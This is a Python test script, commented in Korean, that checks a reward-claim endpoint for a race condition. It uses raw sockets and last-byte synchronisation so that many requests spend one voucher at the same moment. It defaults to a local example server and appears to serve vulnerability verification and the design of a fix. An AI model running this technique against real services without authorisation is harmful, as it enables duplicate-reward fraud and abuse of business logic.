#!/usr/bin/env python3
"""
POST /reward/claim 레이스 컨디션 검증 스크립트 (tc24 방식 적용판)

── tc24에서 빌려온 것 ─────────────────────────────────────────────────────
출처: waf-ips-ids-retest 프로젝트의 TC-24
      https://github.com/windshock/waf-ips-ids-retest/
주의: TC-24 자체는 레이스 기법이 아니라 waf-ips-ids-retest 스킬의 HTTP 요청
스머글링/WAF 우회 테스트 케이스다. 여기서 빌려온 것은 tc24 러너들의 '전송 방식'
뿐이다 — requests 를 버리고 stdlib socket/ssl 로 raw HTTP 바이트를 직접 만들어
sendall() 로 쏘는 방식(http_probe_common.send_raw_http). 바이트/전송 타이밍을
직접 쥐는 이 저수준 제어가 있어야 레이스 컨디션 테스트의 핵심 기법인 "라스트
바이트 동기화(single-packet attack, James Kettle / PortSwigger 'Smashing the
state machine')"를 구현할 수 있다. (스머글링 페이로드는 쓰지 않는다.)

기존 스크립트의 한계:
  threading.Barrier 로 스레드를 한번에 풀어도, 각 requests.post() 는 그때부터
  TCP 연결 + TLS 핸드셰이크 + 요청 전체 전송을 각자 수행한다. 그래서 요청들이
  서버에 수십 ms 씩 흩어져 도착하고, 이는 레이스 윈도우보다 넓을 때가 많다.

tc24 방식(raw socket) 적용:
  1) N개 TCP(+TLS) 연결을 미리 모두 맺어둔다.
  2) 각 요청에서 "마지막 1바이트"만 남기고 전부 미리 보낸다.
     (본문 없는 POST 라 헤더 종료 CRLFCRLF 의 마지막 \n 을 보류)
     → 서버는 헤더 파싱을 마치고 마지막 바이트를 기다리며 멈춰 있게 된다.
  3) 배리어로 전 스레드를 정렬한 뒤, 남겨둔 마지막 바이트를 일제히 flush.
     → N개 요청이 ~1ms 내로 동시에 '완성'되어 레이스 윈도우를 훨씬 잘 맞춘다.
  requests 의존성도 사라지고 stdlib 만으로 동작한다(tc24 러너와 동일).

── 사전 준비 (실제 서버 대상 시) ───────────────────────────────────────────
  1) 발급권을 정확히 1개로 맞춰둘 것
     - GET /reward/count 로 현재 보유 발급권 개수 확인
  2) 일일 발급 가능 건수(dailyQuota)가 요청 수 이상 남아있는지 확인
     - GET /reward/quota 응답의 dailyQuota 필드
  3) 로그인 후 x-session-id 값 확보

── 판정 ────────────────────────────────────────────────────────────────
  - 실패 응답(발급권 부족/일일 한도)은 title+message 만 채워지고 rewardType 이 없다.
    (ClaimResponse @JsonInclude(NON_NULL): 실패 시 rewardType 미설정)
  - 성공(보상 지급) 응답만 rewardType 이 채워진다.
  - 발급권 1개인데 성공 응답이 2건 이상이면 레이스 재현.
  - 결정적 증거: 여러 성공 응답에 동일한 voucherSeq 가 중복 등장
    (= 같은 발급권 row 가 중복 소모됨).
"""
from __future__ import annotations

import argparse
import json
import socket
import ssl
import threading
import time
from urllib.parse import urlparse

# ==================== 기본 대상 (운영 서버에 절대 쏘지 말 것) ====================
# 기본값은 로컬 예제 서버(example_api/claim_server.py). 실제 대상은 --url 로 덮어쓴다.
DEFAULT_URL = "http://127.0.0.1:8091/reward/claim"

HEADERS = {
    "x-session-id": "REPLACE_WITH_YOUR_SESSION_ID",  # 로그인 후 발급받은 세션 값
    "x-client-agent": "client/3.1.0,android_10",
}
# ==============================================================================


def parse_url(url: str) -> tuple[str, str, int, str]:
    p = urlparse(url)
    scheme = p.scheme or "http"
    host = p.hostname or "127.0.0.1"
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return scheme, host, port, path


def build_request_bytes(host: str, port: int, path: str, headers: dict, extra: dict | None = None) -> bytes:
    """본문 없는 POST 요청의 raw 바이트. tc24 러너의 build_* 와 동일한 스타일."""
    host_hdr = host if port in (80, 443) else f"{host}:{port}"
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host_hdr}",
        "User-Agent: RACE-CLAIM-TC24",
        "Content-Length: 0",
        "Connection: close",
    ]
    for k, v in {**headers, **(extra or {})}.items():
        lines.append(f"{k}: {v}")
    # 헤더 종료 CRLFCRLF. 마지막 \n 은 나중에 보류 대상.
    return ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")


class Fired:
    __slots__ = ("idx", "status_code", "elapsed", "body", "served_by", "error")

    def __init__(self, idx):
        self.idx = idx
        self.status_code = None
        self.elapsed = None
        self.body = None
        self.served_by = None
        self.error = None


def safe_json(raw_body: bytes):
    try:
        return json.loads(raw_body.decode("utf-8", errors="replace"))
    except Exception:
        return raw_body.decode("utf-8", errors="replace")[:500]


def _dechunk(data: bytes) -> bytes:
    out, i = b"", 0
    while i < len(data):
        j = data.find(b"\r\n", i)
        if j < 0:
            break
        try:
            size = int(data[i:j].split(b";")[0].strip(), 16)
        except ValueError:
            break
        if size == 0:
            break
        start = j + 2
        out += data[start:start + size]
        i = start + size + 2   # 청크 데이터 + 뒤따르는 CRLF 스킵
    return out


def recv_response(sock: socket.socket, timeout: float) -> tuple[int, dict, bytes]:
    """HTTP/1.1 응답을 견고하게 수신: Content-Length / chunked / close 모두 처리.
    실제 Tomcat/nginx 는 작은 JSON 도 chunked 로 보내며 keep-alive 를 유지하므로,
    끝을 감지하지 못하면 timeout 까지 대기하게 된다 → 여기서 종료 조건을 판정한다."""
    sock.settimeout(timeout)
    buf = b""
    # 1) 헤더 끝까지
    while b"\r\n\r\n" not in buf:
        try:
            b = sock.recv(65536)
        except socket.timeout:
            break
        if not b:
            break
        buf += b
    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    first = lines[0].decode("latin-1", errors="replace")
    parts = first.split()
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    headers = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.strip().lower().decode("latin-1")] = v.strip().decode("latin-1")

    te = headers.get("transfer-encoding", "").lower()
    clen = headers.get("content-length")
    # 2) 본문 종료 판정
    if "chunked" in te:
        while b"\r\n0\r\n\r\n" not in body and b"\n0\r\n\r\n" not in body:
            try:
                b = sock.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            body += b
        body = _dechunk(body)
    elif clen is not None:
        need = int(clen)
        while len(body) < need:
            try:
                b = sock.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            body += b
        body = body[:need]
    else:
        while True:   # 종료 신호 없음 → close 까지
            try:
                b = sock.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            body += b
    return code, headers, body


def worker(
    idx: int,
    scheme: str,
    host: str,
    port: int,
    request_bytes: bytes,
    barrier: threading.Barrier,
    settle: float,
    timeout: float,
    insecure: bool,
    result: Fired,
) -> None:
    head, last_byte = request_bytes[:-1], request_bytes[-1:]  # 마지막 1바이트 보류
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        sock = raw
        if scheme == "https":
            ctx = ssl.create_default_context()  # 기본: 인증서/호스트명 검증 ON
            if insecure:
                # 사설/랩 인증서 대상일 때만 명시적으로 검증 해제 (--insecure)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw, server_hostname=host)
        # 1) TCP_NODELAY: 마지막 바이트가 즉시 나가도록 Nagle 끄기
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        # 2) 마지막 바이트만 남기고 전부 전송 → 서버는 헤더 파싱 후 대기 상태
        sock.sendall(head)
        # 3) 서버가 확실히 '마지막 바이트 대기' 상태로 park 되도록 잠깐 정착
        time.sleep(settle)
        # 4) 전 스레드 정렬 (timeout: 일부 연결이 실패해 배리어에 못 오면 여기서 무한대기 방지)
        barrier.wait(timeout=max(5.0, timeout))
        # 5) 남긴 마지막 바이트 일제 flush → 요청들이 동시에 '완성'
        t0 = time.perf_counter()
        sock.sendall(last_byte)
        code, headers, body = recv_response(sock, timeout)
        result.elapsed = round(time.perf_counter() - t0, 4)
        result.status_code = code
        result.body = safe_json(body)
        result.served_by = headers.get("x-served-by")  # 토폴로지 랩: was1/was2
    except threading.BrokenBarrierError:
        result.error = "BrokenBarrier: 다른 연결 실패/타임아웃으로 동기화 중단"
    except Exception as e:  # noqa: BLE001
        # 이 worker 가 배리어 도달 전에 실패했을 수 있으므로, 대기 중인 나머지 worker 를 깨운다
        barrier.abort()
        result.error = f"{type(e).__name__}: {e}"
    finally:
        try:
            sock.close()
        except Exception:
            pass


def is_success(body) -> bool:
    if not isinstance(body, dict):
        return False
    return bool(body.get("rewardType"))


def run(url: str, concurrent: int, settle: float, timeout: float, insecure: bool,
        extra_headers: dict | None = None, json_out: bool = False) -> int:
    scheme, host, port, path = parse_url(url)
    request_bytes = build_request_bytes(host, port, path, HEADERS, extra_headers)

    barrier = threading.Barrier(concurrent)
    results = [Fired(i) for i in range(concurrent)]
    threads = [
        threading.Thread(
            target=worker,
            args=(i, scheme, host, port, request_bytes, barrier, settle, timeout, insecure, results[i]),
        )
        for i in range(concurrent)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    success_count = 0
    error_count = 0
    seqs = []
    seq_instances: dict = {}   # seq -> set(served_by)  (토폴로지 랩)
    inst_hits: dict = {}
    saw_instance = False
    lines = []
    for r in results:
        if r.error:
            error_count += 1
            lines.append(f"[{r.idx:02d}] ERROR: {r.error}")
            continue
        ok = is_success(r.body)
        success_count += ok
        inst = r.served_by or "-"
        if r.served_by:
            saw_instance = True
        if ok and isinstance(r.body, dict):
            seq = r.body.get("voucherSeq")
            seqs.append(seq)
            seq_instances.setdefault(seq, set()).add(inst)
            inst_hits[inst] = inst_hits.get(inst, 0) + 1
        lines.append(f"[{r.idx:02d}] status={r.status_code} elapsed={r.elapsed}s served_by={inst} "
                     f"{'SUCCESS' if ok else 'blocked'} body={r.body}")

    dup_seqs = {s for s in seqs if seqs.count(s) > 1}
    race = success_count >= 2

    if json_out:
        print(json.dumps({
            "technique": "last-byte", "url": url, "concurrent": concurrent,
            "success": success_count, "errors": error_count,
            "race": race, "dup_voucher": bool(dup_seqs),
            "by_instance": inst_hits,
        }, ensure_ascii=False))
        return 2 if race else 0

    print(f"=== 대상: {url}  (동시 {concurrent}건, 라스트바이트 동기화) ===")
    if scheme == "https" and insecure:
        print("    (--insecure: 사설/랩 인증서 검증 생략)")
    print(f"\n=== 총 {concurrent}건 요청 결과 ===")
    for ln in lines:
        print(ln)
    print(f"\n성공(보상 지급) 응답 수: {success_count} / {concurrent}"
          + (f"  (오류 {error_count}건)" if error_count else ""))
    if saw_instance and inst_hits:
        print(f"   인스턴스별 성공 분포: {inst_hits}")
    if race:
        print("=> 발급권 1개로 2건 이상 보상 지급됨: 레이스 컨디션 재현")
        if dup_seqs:
            print(f"=> 결정적 증거: 동일 voucherSeq({dup_seqs})가 여러 성공 응답에 중복 등장 "
                  f"-> 같은 발급권 row 가 중복 소모됨")
            cross = {s: insts for s, insts in seq_instances.items() if len(insts) > 1}
            if cross:
                print(f"=> 교차-인스턴스 증거: {cross} — 같은 발급권이 was1/was2 양쪽에서 소모됨 "
                      f"⇒ JVM-local 락으론 못 막음, 분산락(distributed) 필요")
        else:
            print(f"   (성공 응답들의 voucherSeq: {seqs} — 서로 다르면 발급권이 "
                  f"실제로 1개였는지 DB 재확인 필요)")
        return 2
    if success_count == 1:
        print("=> 1건만 성공: 이번 실행에선 레이스 미재현 (정상). 반복 실행 권장")
    else:
        print(f"=> 0건 성공: 전부 실패/차단 (오류 {error_count}건). 대상/발급권/네트워크 확인")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="claim 레이스 검증 (tc24 raw-socket + 라스트바이트 동기화)")
    ap.add_argument("--url", default=DEFAULT_URL, help=f"대상 URL (기본: {DEFAULT_URL})")
    ap.add_argument("-n", "--concurrent", type=int, default=20, help="동시 요청 수 (기본 20)")
    ap.add_argument("--settle", type=float, default=0.15,
                    help="마지막 바이트 flush 전 정착 대기(초). 서버가 park 되도록. 기본 0.15")
    ap.add_argument("--timeout", type=float, default=10.0, help="소켓 타임아웃(초)")
    ap.add_argument("--insecure", action="store_true",
                    help="https 대상의 인증서/호스트명 검증 해제 (사설/랩 인증서 전용)")
    ap.add_argument("-H", "--header", action="append", default=[],
                    help="추가 요청 헤더 'Key: Value' (반복 가능). 예: -H 'X-Lock-Mode: distributed'")
    ap.add_argument("--json", action="store_true", help="요약 1줄 JSON 만 출력(벤치마크용)")
    args = ap.parse_args()
    extra = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra[k.strip()] = v.strip()
    return run(args.url, args.concurrent, args.settle, args.timeout, args.insecure, extra, args.json)


if __name__ == "__main__":
    raise SystemExit(main())
